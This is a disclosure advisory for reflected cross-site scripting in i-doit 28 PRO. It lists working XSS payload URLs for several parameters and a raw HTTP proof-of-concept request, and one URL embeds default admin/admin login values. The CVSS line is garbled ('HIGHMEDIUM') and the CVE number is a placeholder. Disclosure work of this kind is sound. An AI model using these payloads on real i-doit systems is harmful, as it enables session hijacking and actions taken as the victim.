# CVE-2024-?

## Vulnerability Details:

- **CVSS Score:** 6.8 HIGHMEDIUM (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:L)

- **Affected Component:** [I-DOIT](https://www.i-doit.com) parameters:

    | Parameter                    | Description                                       | URL (PoC)        |
    |------------------------------|---------------------------------------------------|------------|
    | id                           | Identifier parameter                              | /?moduleID=7&id=s3j5b%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22kmc6x&mNavID=2&lang=de |
    | lang                         | Language parameter                                | /?mNavID=2&lang=gui4c%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22ku6le&tenant_id=1  | 
    | mNavID                       | Navigation identifier parameter                   | /?mNavID=aqaal%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22el125&lang=de&tenant_id=1 |
    | name (arbitrarily supplied) | Name of an arbitrarily supplied URL parameter     | /?navMode=&sort=&dir=&id=&navPageStart=&navTemplateDetailView=&template=&useTemplate=&popupReceiver=&_csrf_token=1698.wxfibOhTA0_Y5hIPtKFSbmcrrEAO7zOoiGTUmvtApXU.omW1PKBrZCG0k1RV8uJqNy5Gny1qvwv7-gmV45d30RqbWowurgFJHomqIg&HTTP_GOTO=&login_username=admin&login_password=admin&login_submit=&uo703%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22vnuwwxvu6hf=1 |
    | pID                          | ID parameter                                      | /?moduleID=7&pID=bzon8%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22bsv0h |
    | treeNode                     | Tree node parameter                               | /?moduleID=1021&treeNode=1021360494'%3balert(1)%2f%2f883&pID=type-config |
    | type                         | Type parameter                                    | /?viewMode=1101&type=cehtj%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22g3asdsxian9&view=object&mNavID=2&lang=de&navMode=&sort=&dir=&id=&navPageStart=&navTemplateDetailView=&template=&useTemplate=&popupReceiver=&_csrf_token=&q=dDLqSW&submit_isys_form=&C_VISUALIZATION_OBJ_SELECTION=dDLqSW&C_VISUALIZATION_OBJ_SELECTION__HIDDEN=&C_VISUALIZATION_OBJ_SELECTION__CONFIG=%7B%22type%22%3A%22f_popup%22%2C%22p_strPopupType%22%3A%22browser_object_ng%22%2C%22name%22%3A%22C_VISUALIZATION_OBJ_SELECTION%22%2C%22disableInputGroup%22%3Atrue%2C%22p_bDisableDetach%22%3Atrue%2C%22p_bInfoIconSpacer%22%3A0%2C%22p_strValue%22%3A%22%22%2C%22p_strPlaceholder%22%3A%22Bitte+Objekt+ausw%5Cu00e4hlen%22%2C%22callback_accept%22%3A%22idoit.callbackManager.triggerCallback%28%27visualization-init-explorer%27%29%3B%22%2C%22nowiki%22%3A1%2C%22disablePrimaryConditions%22%3Afalse%2C%22disableSecondaryConditions%22%3Afalse%2C%22disableCustomConditions%22%3Afalse%2C%22use_auth%22%3Afalse%2C%22p_onClick%22%3A%22if+%28%21this.getValue%28%29.blank%28%29%29+%7Bthis.writeAttribute%28%27placeholder%27%2Cthis.readAttribute%28%27data-last-value%27%29%29.setValue%28%27%27%29%3B%7D%22%2C%22p_onBlur%22%3A%22if+%28this.getValue%28%29.blank%28%29%29+%7Bthis.setValue%28this.readAttribute%28%27data-last-value%27%29%29%3B%7D%22%2C%22p_strSuggest%22%3A%22object-browser%22%2C%22p_strSuggestView%22%3A%22C_VISUALIZATION_OBJ_SELECTION__VIEW%22%2C%22p_strSuggestHidden%22%3A%22C_VISUALIZATION_OBJ_SELECTION__HIDDEN%22%2C%22p_strSuggestParameters%22%3A%22parameters%3A+%7B%5C%22typeFilter%5C%22%3Anull%2C%5C%22catFilter%5C%22%3Anull%2C%5C%22typeBlacklist%5C%22%3Anull%2C%5C%22cmdb_filter%5C%22%3Anull%2C%5C%22customFilters%5C%22%3Anull%7D%2CselectCallback%3A+function%28view%2C+li%29+%7Bview.writeAttribute%28%27data-last-value%27%2C+li.readAttribute%28%27title%27%29%29%3Bidoit.callbackManager.triggerCallback%28%27visualization-init-explorer%27%29%3B%7D%22%2C%22checkRight%22%3A%22isys_auth%3A%3AEDIT%22%2C%22p_additional%22%3A%22+data-hidden-field%3D%5C%22C_VISUALIZATION_OBJ_SELECTION__HIDDEN%5C%22+data-last-value%3D%5C%22%5C%22%22%2C%22id%22%3A%22C_VISUALIZATION_OBJ_SELECTION__VIEW%22%7D&SM2__C_VISUALIZATION_OBJ_SELECTION%5Bp_strPopupType%5D=browser_object_ng&SM2__C_VISUALIZATION_OBJ_SELECTION%5Bp_strSelectedID%5D=&SM2__C_VISUALIZATION_OBJ_SELECTION%5Bp_arData%5D=&SM2__C_VISUALIZATION_OBJ_SELECTION%5Bp_strTable%5D=&SM2__C_VISUALIZATION_OBJ_SELECTION%5Bp_strValue%5D=&SM2__C_VISUALIZATION_OBJ_SELECTION%5Bmultiselect%5D=&SM2__C_VISUALIZATION_OBJ_SELECTION%5Btype%5D=f_popup&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Bp_strPopupType%5D=visualization_itservice_selection&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Bp_strSelectedID%5D=&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Bp_arData%5D=&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Bp_strTable%5D=&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Bp_strValue%5D=&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Bmultiselect%5D=&SM2__C_VISUALIZATION_IT_SERVICE_SELECTION%5Btype%5D=f_popup&C_VISUALIZATION_PROFILE=1&SM2__C_VISUALIZATION_PROFILE%5Bp_strPopupType%5D=visualization_profile&SM2__C_VISUALIZATION_PROFILE%5Bp_strSelectedID%5D=&SM2__C_VISUALIZATION_PROFILE%5Bp_arData%5D=&SM2__C_VISUALIZATION_PROFILE%5Bp_strTable%5D=&SM2__C_VISUALIZATION_PROFILE%5Bp_strValue%5D=&SM2__C_VISUALIZATION_PROFILE%5Bmultiselect%5D=&SM2__C_VISUALIZATION_PROFILE%5Btype%5D=tree&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Bp_strPopupType%5D=visualization_export&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Bp_strSelectedID%5D=&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Bp_arData%5D=&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Bp_strTable%5D=&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Bp_strValue%5D=&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Bmultiselect%5D=&SM2__C_VISUALIZATION_EXPORT_BUTTON%5Btype%5D=f_popup&C_VISUALIZATION_SERVICE_FILTER=-1&SM2__C_VISUALIZATION_SERVICE_FILTER%5Bp_strSelectedID%5D=&SM2__C_VISUALIZATION_SERVICE_FILTER%5Bp_strTable%5D=&SM2__C_VISUALIZATION_SERVICE_FILTER%5Bp_arData%5D=a%3A6%3A%7Bi%3A-1%3Bs%3A1%3A%22-%22%3Bi%3A1%3Bs%3A7%3A%22Level+1%22%3Bi%3A2%3Bs%3A7%3A%22Level+2%22%3Bi%3A3%3Bs%3A7%3A%22Level+3%22%3Bi%3A4%3Bs%3A7%3A%22Level+4%22%3Bi%3A5%3Bs%3A7%3A%22Level+5%22%3B%7D&SM2__C_VISUALIZATION_SERVICE_FILTER%5Btype%5D=f_dialog&LogbookCommentary= |
    | view                         | View parameter                                    | /?viewMode=1101&type=tree&view=object38032'%3balert(1)%2f%2f845&mNavID=2&lang=en |

- **Vulnerability Type:** Cross-site scripting Reflected (XSS)

- **Impact:** If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:
  - Perform any action within the application that the user can perform.
  - View any information that the user is able to view.
  - Modify any information that the user is able to modify.
  - Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

- **Exploitability:** The vulnerability can be exploited by crafting specifically malicious queries and submitting them through the vulnerable parameters.

- **Affected Versions:** Tested only in [I-DOIT](https://www.i-doit.com) 28 PRO

- **Details:** A Reflected Cross-Site Scripting (XSS) vulnerability occurs when user input is not properly sanitized by a web application and is then echoed back to the user's browser without adequate encoding. This allows an attacker to inject and execute malicious scripts within the context of the victim's session.

- **Mitigation:** Preventing cross-site scripting isn't a simple fix that you can turn on or off. Depending on the web application, protection strategies will differ. That said, it's important to consider the following strategies for how to mitigate cross-site scripting.

  - **Whenever possible, prohibit HTML code in inputs.** Preventing users from posting HTML code into form inputs is a straightforward and effective measure.
  - **Validate inputs.** If you're going to accept form inputs, validating the data to ensure it meets specific criteria will be helpful
  - **Secure your cookies.** Setting rules for your web applications defining how cookies are handled can prevent XSS and even block JavaScript from accessing cookies.
  - **Sanitize data.** Similar to validation, sanitizing occurs after data has been posted but before it is executed. Look for online tools like HTMLSanitizer to sanitize HTML code online for XSS vulnerabilities.
  - **Use a web application firewall (WAF).** Rules can be created on a WAF to specifically address XSS by blocking abnormal server requests. A robust WAF should be a key component of your organization's security strategy, as it can also prevent SQL injection attacks, distributed denial-of-service attacks and other common threats.

## Proof of Concept (PoC):

An attacker could craft a malicious request to exploit the vulnerability:

```HTTP Request
GET /?moduleID=7&id=s3j5b%22onmouseover%3d%22alert(1)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22kmc6x&mNavID=2&lang=de HTTP/1.1
Host: 192.168.1.46
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: PHPSESSID=3e9a5hs6b6rbcmv77aipbkhddu
Upgrade-Insecure-Requests: 1
Referer: http://192.168.1.46/?moduleID=7&id=5047
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```

![image](https://github.com/offensive-security-pwncat/CVE-2024-XSS/blob/main/photo_2024-02-25%2011.00.24.jpeg?raw=true)

## Recommendations:

- **Patch:** Develop and deploy a patch or update that addresses the XSS Reflected vulnerabilities in the affected parameters.

- **Education:** Provide training and resources to developers on secure coding practices, emphasizing the importance of input validation and preventing XSS Refelcted vulnerabilities.

